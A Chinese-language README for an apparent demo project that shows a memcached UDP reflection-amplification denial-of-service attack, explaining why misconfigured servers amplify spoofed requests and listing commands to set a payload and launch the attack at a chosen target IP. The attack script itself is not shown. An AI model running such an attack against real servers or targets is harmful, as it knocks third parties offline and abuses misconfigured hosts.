# memcached_dos

基于memcached dos反射放大攻击演示demo

## 原理解析

Memcached是一种基于内存的key-value对象缓存系统，可使用udp协议进行获取数据。由于udp协议本身无法验证来源ip的真实性和k-v中value可保存数据远大于key，配置错误的服务器可以用来反弹进行dos放大攻击

## demo依赖

- docker、docker-compose
- python3.7、pip

## 使用方法

> 以下命令均默认在本readme目录下执行，linux环境

1. 执行以下命令启动memcached服务

    ``` shell
    docker-compose up -d
    ```

2. 安装python执行依赖

    ``` shell
    pip install -r requirements.txt
    ```

3. 设置payload

    ``` shell
    sudo python3.7 memcached_dos.py --server-ip "memcached server address" [--server-port "memcached server port"] setpayload
    ```

4. attack

    ``` shell
    sudo python3.7 memcached_dos.py --server-ip "memcached server address" [--server-port "memcached server port"] attack --target-ip "dos attack target address"
    ```
